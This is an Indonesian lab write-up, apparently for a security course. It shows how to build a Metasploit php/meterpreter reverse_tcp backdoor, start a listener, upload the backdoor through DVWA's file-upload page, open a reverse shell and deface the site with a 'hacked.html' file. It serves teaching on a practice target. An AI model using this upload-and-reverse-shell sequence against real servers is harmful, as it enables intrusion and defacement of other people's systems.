## LESSON 8

Inti dari Lesson 8 adalah mendapatkan 4 hal, yaitu:
1. Membuat **php/meterpreter/reverse_tcp payload**
2. Menjalankan **php/meterpreter/reverse_tcp listener**
3. Mengunggah **php payload** menggunakan **DVWA Upload Screen**
4. Menggunakan **php payload** untuk membuat koneksi dengan **DVWA**

**NOTE**
- IP yang digunakan adalah sesuai dengan IP tempat DVWA ter-deploy

### Langkah-langkah

**A. Membangun PHP msfpayload**
1. Masukkan command berikut untuk membuat **msfpayload**

```
mkdir -p /root/backdoor
cd /root/backdoor
msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 R > PHONE_HOME.php
ls -l PHONE_HOME.php
```

![SS 1](LESSON_8/1.png)

2. **Edit PHONE_HONE.php**

```
Hilangkan # pada <?php
```

![SS 2](LESSON_8/2.png)

**B. Menjalankan PHP Payload Listener**
1. Masukkan command berikut

```
msfconsole
```

![SS 3](LESSON_8/3.png)

2. Jalankan command berikut

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.104
set LPORT 4444
exploit
```

![SS 4](LESSON_8/4.png)

**C. Login DVWA**

![SS 5](LESSON_8/5.png)

**D. Ubah Security Level**

![SS 6](LESSON_8/6.png)

**E. Upload PHP Payload**
1. Masuk ke dalam **Upload** lalu klik **Browse* dan cari file **PHONE_HOME.php**

![SS 7](LESSON_8/7.png)

2. Klik **Upload** sehingga muncul pesan sama seperti gambar di bawah

![SS 8](LESSON_8/8.png)

Didapatkan **Privileges** dari **User** yang diinginkan

3. Aktifkan **PHONE_HOME.php** dengan cara klik file tersebut setelah berada di halaman berikut

```
http://192.168.1.103/dvwa/hackable/uploads/
```

![SS 9](LESSON_8/9.png)

4. Koneksi telah stabil

![SS 10](LESSON_8/10.png)

5. Lakukan **Shell**

```
shell
uptime
pwd
whoami
w
echo "Hacked at 12-18-2017, by Sani Hacker" > hacked.html
ls -l
```

![SS 11](LESSON_8/11.png)

**F. Testing**
1. Buka **hacked.html** pada alamat berikut

```
http://192.168.1.103/dvwa/hackable/uploads
```

![SS 12](LESSON_8/12.png)

2. Hasil

![SS 13](LESSON_8/13.png)

### Kesimpulan Lesson 8

Menggunakan **msfconsole** dapat menambahkan file-file baru pada **DVWA**
